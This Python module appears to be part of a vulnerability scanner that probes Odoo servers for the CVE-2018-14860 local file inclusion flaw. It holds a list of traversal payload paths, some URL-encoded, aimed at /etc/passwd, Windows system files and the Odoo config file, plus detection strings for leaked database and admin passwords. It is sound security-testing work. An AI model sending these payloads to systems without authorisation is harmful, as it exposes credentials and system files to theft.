"""Local File Inclusion checks via static file path abuse."""

from orca.checks.base import BaseCheck
from orca.findings import Severity


# CVE-2018-14860 / Odoo 12 LFI PoCs
LFI_PATHS = [
    # Windows targets
    "/base_import/static/c:/windows/win.ini",
    "/web/static/c:/windows/win.ini",
    "/base/static/c:/windows/win.ini",
    "/web/static/c:/windows/system32/drivers/etc/hosts",
    "/base_import/static/c:/windows/system32/drivers/etc/hosts",
    # Linux targets
    "/base_import/static/etc/passwd",
    "/web/static/etc/passwd",
    "/base/static/etc/passwd",
    "/base_import/static/etc/hosts",
    "/web/static/etc/hosts",
    "/base_import/static/etc/odoo/odoo.conf",
    "/web/static/etc/odoo/odoo.conf",
    # Generic traversal attempts that sometimes work
    "/web/static/../../../etc/passwd",
    "/base_import/static/../../../etc/passwd",
    "/web/static/..%2f..%2f..%2fetc/passwd",
    "/base_import/static/..%2f..%2f..%2fetc/passwd",
]


class LFICheck(BaseCheck):
    name = "lfi"
    description = "Test for local file inclusion via static file path abuse (CVE-2018-14860)"
    requires_auth = False

    def run(self) -> None:
        for path in LFI_PATHS:
            try:
                resp = self.target.get(path, timeout=8, allow_redirects=False)
                if resp.status_code == 200:
                    text = resp.text[:800]
                    indicators = [
                        "root:",
                        "[boot loader]",
                        "[fonts]",
                        "[extensions]",
                        "[mci extensions]",
                        "[files]",
                        "[Mail]",
                        "127.0.0.1",
                        "::1",
                        "[options]",
                        "db_host",
                        "db_password",
                        "admin_passwd",
                    ]
                    if any(ind in text for ind in indicators):
                        self.add_finding(
                            title=f"Local File Inclusion: {path}",
                            description=f"The static file endpoint {path} returned a local system file. This is a path traversal / LFI vulnerability (CVE-2018-14860 style).",
                            severity=Severity.CRITICAL,
                            request=f"GET {path}",
                            response_snippet=text[:600],
                            response_status=resp.status_code,
                            remediation="Sanitize static file serving paths. Do not allow path traversal sequences in static file routes.",
                            cwe="CWE-22",
                            references=[
                                "https://nvd.nist.gov/vuln/detail/CVE-2018-14860",
                                "https://github.com/EmreOvunc/Odoo-12.0-LFI-Vulnerabilities",
                            ],
                        )
                        break
            except Exception:
                pass
